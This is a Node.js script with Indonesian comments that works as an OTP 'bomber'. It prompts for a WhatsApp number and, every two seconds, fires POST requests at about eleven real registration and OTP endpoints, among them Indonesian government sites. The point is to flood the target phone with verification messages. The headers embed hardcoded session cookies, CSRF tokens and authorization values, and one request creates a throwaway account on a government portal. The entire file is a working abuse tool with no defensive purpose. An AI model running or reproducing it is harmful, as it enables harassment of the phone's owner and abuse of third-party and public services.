const axios = require("axios");
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

class Headers {
  // kumpulan headers //
  static oss = {
      "Accept-Language": "id",
      "User_key": "846ee507525c6b00d18733e066bd5686",
      "Sec-Ch-Ua-Mobile": "?1",
      "Authorization": "Basic T1NTMDAwOlV4NEJYVkJXVzJWZmFGRXhVenRVWmxKakFHdFFPbEZx",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Sec-Ch-Ua-Platform": "Android",
      "Origin": "https://ui-login.oss.go.id",
      "Sec-Fetch-Site": "same-site",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://ui-login.oss.go.id/",
      "Accept-Encoding": "gzip, deflate, br",
      "Cache-Control": "no-cache, no-store",
      "Host": "api-prd.oss.go.id"
  };
  
  static sinbad = {
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "Sec-Ch-Ua-Mobile": "?1",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Sec-Ch-Ua-Platform": "Android",
      "Origin": "https://sinbad.sda.pu.go.id",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://sinbad.sda.pu.go.id/simadu/register.php",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "PHPSESSID=fdrie9stsjo8h1lhgbnvr6euh2",
      "Cache-Control": "no-cache, no-store",
      "Host": "sinbad.sda.pu.go.id"
  };
  
  static lexus = {
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "Sec-Ch-Ua-Mobile": "?1",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Sec-Ch-Ua-Platform": "Android",
      "Origin": "https://lexus63.com",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://lexus63.com/register",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "PHPSESSID=e380k71it623nhp9m21tii7per",
      "Cache-Control": "no-cache, no-store",
      "Host": "lexus63.com"
  };
  
  static thintofat = {
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "Sec-Ch-Ua-Mobile": "?1",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Sec-Ch-Ua-Platform": "Android",
      "Origin": "https://thintofat.vivianegan.com",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://thintofat.vivianegan.com/home/signup",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "ttf_session=9b844a8530ee98eeff71398d18445fc84a448b53; _ga=GA1.1.1185631988.1766085060; _fbp=fb.1.1766085060469.979858715630872520; _ga_N69X0RP0N3=GS2.1.s1766085060$o1$g0$t1766085063$j57$l0$h0",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
      "Host": "thintofat.vivianegan.com"
  };
  
  static mumbai = {
      "Sec-Ch-Ua-Platform": "Android",
      "Sec-Ch-Ua-Mobile": "?1",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Accept": "*/*",
      "Origin": "https://www.iskconmumbai.com",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://www.iskconmumbai.com/web/signup",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "frontend_lang=en_US; session_id=8e52e545fd895ab9ba02c52f7539e75851f8392a; tz=Asia/Jakarta; _ga=GA1.1.1371592510.1766138882; _gcl_au=1.1.1146962822.1766138882; _ga_B45EC76905=GS2.1.s1766138881$o1$g1$t1766138898$j43$l0$h0",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
      "Host": "www.iskconmumbai.com"
  };
  
  static jobok = {
      "Content-Type": "application/json",
      "Sec-Ch-Ua-Mobile": "?1",
      "Authorization": "Bearer 005b4539a97c8fcc965b4918d2a61e50",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Sec-Ch-Ua-Platform": "Android",
      "Origin": "https://www.jobbook.co",
      "Sec-Fetch-Site": "same-site",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://www.jobbook.co/",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
      "Host": "api.jobbook.co"
  };
  
  static tubankab = {
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "Sec-Ch-Ua-Mobile": "?1",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
      "Sec-Ch-Ua-Platform": "Android",
      "Origin": "https://toss.tubankab.go.id",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://toss.tubankab.go.id/register",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "XSRF-TOKEN=eyJpdiI6ImJWZ0lnaksxZUZSVTNDbkZjNjFPeUE9PSIsInZhbHVlIjoid1huWStCelRPTUJXeXBSWk82UzVnUFpnNWJ0ckRIYmhXazVhUy9MeEpqYzVYRUVlTUVteWtpeTlCV084eHhDM2NLVWxLZnl6NmFkbWFSOG1lOEVPR3RLc3VQcjNDcUhNSjBvVFg3czl3UFI3bDBiSEFzZzBEakpOUXlUaHRMTUMiLCJtYWMiOiI5ZjI1ZDA0ZmU5NGNiY2I5ZDRhMmIwZGIzNTZjMWY2ODhhNmM3NTcwMzMyMzQxMDcxOWI5YzAyNjYxMGM0YzM2IiwidGFnIjoiIn0%3D; toss_session=eyJpdiI6Imx2bHVTYVZGOUxJR0FYTmRMUWFmMGc9PSIsInZhbHVlIjoieEttY0hIUHpVcEdETjIxT3dsdURCYitaajhoSHMxWVFWbjQ1VkEzY3ZXMzBsdTBmalhoVDhJODEyVjFKd3FmRXQ4bCsxM2cvM1REUFZ4YjA3bFVyR2tZREVzYVVTK3JiQVVVaGdJK2tkM3g3Z3dyYUJzZkRRdlk0VVhyMS90elAiLCJtYWMiOiI3MDk5MjRjZjNlZTEyYmQ3ZmQ2NWJhZGJiMTIwMzdiOGQ4MTg5NDg0YzNmOWI1YzYxYWNkMWYwYTJjMjMwZWQxIiwidGFnIjoiIn0%3D",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
      "Host": "toss.tubankab.go.id"
  };
  

     
     static cititex = {
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
          "Content-Type": "application/x-www-form-urlencoded",
          "Accept": "*/*",
          "Origin": "https://cititex.com",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Dest": "empty",
          "Referer": "https://cititex.com/id/register",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
          "Cache-Control": "no-cache",
          "Pragma": "no-cache"
     };
     
     static ghlindia = {
          "Accept": "application/json, text/javascript, */*; q=0.01",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Sec-Ch-Ua-Mobile": "?1",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
          "Sec-Ch-Ua-Platform": "Android",
          "Origin": "https://www.ghlindia.com",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Dest": "empty",
          "Referer": "https://www.ghlindia.com/register",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
          "Cookie": "PHPSESSID=4b7146ca275404a6b71af9fbbbdb9850; _gcl_au=1.1.1883601528.1766477091; _ga=GA1.1.887437650.1766477091; _clck=ydr8be%5E2%5Eg23%5E0%5E2183; _fbp=fb.1.1766477091348.816201897972723007; _clsk=tpxtw4%5E1766477092472%5E1%5E1%5Ey.clarity.ms%2Fcollect; _uetsid=1068d3a0dfd611f0b1fac1337a4bb09c; _uetvid=10691e50dfd611f08cdd0d4aa4affbfa; _ga_0JKJ5D7H61=GS2.1.s1766477090$o1$g1$t1766477130$j20$l0$h0",
          "Cache-Control": "no-cache",
          "Pragma": "no-cache",
          "Host": "www.ghlindia.com"
     };
     
     static real = {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Sec-Ch-Ua-Mobile": "?1",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
          "Sec-Ch-Ua-Platform": "Android",
          "Origin": "https://erp.realtosmart.com",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Dest": "empty",
          "Referer": "https://erp.realtosmart.com/signup",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
          "Cookie": "ci_session=32f12bcbf1e073793d65889ec6b2c46a8e94d2aa; rzp_unified_session_id=RxW15KuQa0YqKc",
          "Cache-Control": "no-cache",
          "Pragma": "no-cache",
          "Host": "erp.realtosmart.com"
     };
}

rl.question("No Wa [08xxx] : ", (hp) => {
   (function Main(){
     // Tempat pengumpulan data post //
      const request = [
        {
          url: "https://api-prd.oss.go.id/v1/reg/new/pelaku_usaha/send_otp?visitorId=26662112cb008f94ee0c6541a536eb70",
          headers: Headers.oss,
          data: JSON.stringify({
            no_telp: hp,
            email: "data92922o2o2@gmail.com",
            sendWhatsapp: true,
            flag_umk: "N",
            jenis_pelaku_usaha: "02",
            verifyUser: false
          })
        },
        
        {
          url: "https://sinbad.sda.pu.go.id/simadu/global/API/sv_register.php",
          headers: Headers.sinbad,
          data: new URLSearchParams({
            cpassword: "Sarkolok456!",
            idgrupbalai: 5,
            lvl: 2,
            name: "Sangka1",
            no_wa: hp.startsWith("+62") ? "0" + hp.slice(3) : hp, 
            password: "Sarkolok456!",
            token: "",
            username: "Sangka1",
          })
        },
        
        {
          url: "https://lexus63.com/handle/sendOTP2.php",
          headers: Headers.lexus,
          data: new URLSearchParams({
            dest: hp.startsWith("0") ? "+62" + hp.slice(0) : hp,
            type: 1,
          })
        },

        {
           url: "https://lexus63.com/handle/sendwaOTP.php",
           headers: Headers.lexus,
           data: new URLSearchParams({
             dest: hp.startsWith("0") ? "+62" + hp.slice(0) : hp,
             type: 1
           })
        },
        
        {
          url: "https://thintofat.vivianegan.com/home/signup_otp",
          headers: Headers.thintofat,
          data: new URLSearchParams({
            ci_csrf_token: "",
            email: hp,
            nama: ""
          })
        },
        
        {
          url: "https://www.iskconmumbai.com/api/send_otp",
          headers: Headers.mumbai,
          data: JSON.stringify({
            id: "6",
            jsonrpc: "2.0",
            method: "call",
            paeams:{
              signup: true,
              mobile: hp.startsWith("0") ? "+62" + hp.slice(0) : hp,
            }
          })
        },
        
        {
          url: "https://api.jobbook.co/api/register-send-otp",
          headers: Headers.jobok,
          data: JSON.stringify({
            isNewUser: true,
            phone: hp.startsWith("+62") ? "0" + hp.slice(3) : hp,
            countryCode: "+62",
            countryName: "ID"
          })
        },
        
        {
          url: "https://toss.tubankab.go.id/register/otp/act",
          headers: Headers.tubankab,
          data: new URLSearchParams({
            _token: "i7RedS2GsvNGLzBcCamilLkVpW2bmvxRz8YWicGm",
            nohp: hp,
          })
        },
        
       
       {
         url: "https://cititex.com/api/auth/callback/credentials",
         headers: Headers.cititex,
         data: new URLSearchParams({
              callbackUrl: "https://cititex.com/id/register",
              csrfToken: "7892a7fa9452bd7b316e06356fc641b10f0cba9b29697e6f4c28548aaa8300ba",
              googleAuthToken: "undefined",
              isRegister: "true",
              json: "true",
              phoneNumber: hp.startsWith("0") ? "62" + hp.slice(1) : hp,
              redirect: "false",
              status: "register"
           })
       },
       
       {
         url: "https://www.ghlindia.com/otpfinalsmtp",
         headers: Headers.ghlindia,
         data: new URLSearchParams({
            emailid: "kalas96@gmail.com",
            name: "0",
            phone: hp.startsWith("0") ? "8" + hp.slice(1) : hp,
            phonecode: "62",
            send_otp_wapp: "Yes"
          })
       },
       
       {
         url: "https://erp.realtosmart.com/WhatsappOTPVerification",
         headers: Headers.real,
         data: new URLSearchParams({
           country_code: "62",
           mobile: "82186223057",
           randomCode: "NDAxNTgz"
         })
       },
   ] // End //
      
   function sendRequest({url, data, headers}){
     axios.post(url,data,{headers})
       .then(response => {
          if(response.status === 200){
            console.log(`[200] Terkirim => ${url}`)
          }
        })
       
       .catch(err => {console.log(`[error] ${url}`)})
  
   }
  
   setInterval(() => {
      request.forEach(sendRequest);
   }, 2000)  
      
   })();
   
   rl.close();
})
            
